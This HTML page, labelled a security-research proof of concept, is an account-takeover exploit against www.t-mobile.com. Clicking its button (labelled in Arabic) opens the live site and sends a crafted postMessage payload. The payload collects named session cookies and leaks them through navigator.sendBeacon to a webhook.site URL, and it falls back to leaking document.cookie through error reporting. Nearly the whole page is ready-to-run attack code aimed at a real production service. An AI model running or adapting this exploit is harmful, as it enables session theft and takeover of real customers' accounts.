<!doctype html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <title>Security Research PoC - T-Mobile ATO</title>
    <style>
        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background-color: #000; color: #fff; text-align: center; padding: 100px; }
        .container { border: 2px solid #e20074; padding: 50px; border-radius: 20px; display: inline-block; box-shadow: 0 0 20px #e20074; }
        h1 { color: #e20074; margin-bottom: 10px; }
        p { color: #888; margin-bottom: 30px; }
        .btn { background-color: #e20074; color: white; border: none; padding: 15px 40px; font-size: 1.2rem; border-radius: 5px; cursor: pointer; transition: 0.3s; }
        .btn:hover { background-color: #ff0084; transform: scale(1.05); }
        #status { margin-top: 20px; font-weight: bold; color: #00ff00; }
    </style>
</head>
<body>

<div class="container">
    <h1>T-Mobile Critical Vulnerability PoC</h1>
    <p>Target Domain: <strong>www.t-mobile.com</strong></p>
    <button class="btn" onclick="startExploit()">تشغيل الهجوم التلقائي</button>
    <div id="status">جاهز للإرسال...</div>
</div>

<script>
    function startExploit() {
        const statusDiv = document.getElementById('status');
        const webhookURL = "https://webhook.site/3d2d99ff-5472-455e-84e4-64f5035e227f"; // ضع الرابط الخاص بك هنا

        statusDiv.innerText = "جاري فتح نافذة الضحية...";
        
        // 1. فتح نافذة الهدف
        const victimWin = window.open('https://www.t-mobile.com/', '_blank');

        if (!victimWin) {
            statusDiv.style.color = "red";
            statusDiv.innerText = "خطأ: المتصفح منع النوافذ المنبثقة!";
            return;
        }

        statusDiv.innerText = "انتظار تحميل السكربتات (15 ثانية)...";

        // 2. كود الـ Payload الذي سيعمل داخل T-Mobile
        // تم استخدام navigator.sendBeacon لتخطي الـ Service Worker
        const payloadCode = `() => {
            try {
                // تجميع الكوكيز الحساسة فقط لضمان الحجم
                const k = ['a_token', 'TFPID', 'LPVID', 'TMUT'];
                const cookies = document.cookie.split('; ').filter(c => k.some(n => c.startsWith(n))).join('|');
                
                // تسريب البيانات فوراً عبر Beacon (Silent Exfiltration)
                const leakData = {
                    cookies: cookies,
                    origin: location.origin,
                    path: location.pathname,
                    ts: Date.now()
                };
                
                navigator.sendBeacon('${webhookURL}/?leak=' + btoa(JSON.stringify(leakData)));
                
                console.log("%c [!] Data Exfiltrated Successfully", "color: red; font-weight: bold;");
            } catch(e) {
                // في حالة الفشل، سيتم التقاط الخطأ بواسطة Phoenix/Quantum وإرساله أيضاً
                throw new Error("CriticalChain:" + document.cookie);
            }
            return 'LPExternalWindowClosed';
        }`;

        // 3. إرسال الـ Exploit بعد استقرار الصفحة
        setTimeout(() => {
            statusDiv.innerText = "جاري حقن الـ Payload في الـ DOM...";
            
            const message = {
                "type": "LPExternalWindowClosed",
                "details": {
                    "toString": payloadCode
                },
                "source": "secureStorage"
            };

            // إرسال الكائن كـ JSON String لضمان المعالجة من قبل Listener الموقع
            victimWin.postMessage(JSON.stringify(message), "*");
            
            statusDiv.innerText = "تم إرسال الهجوم! تحقق من Webhook الآن.";
        }, 15000);
    }
</script>

</body>
</html>
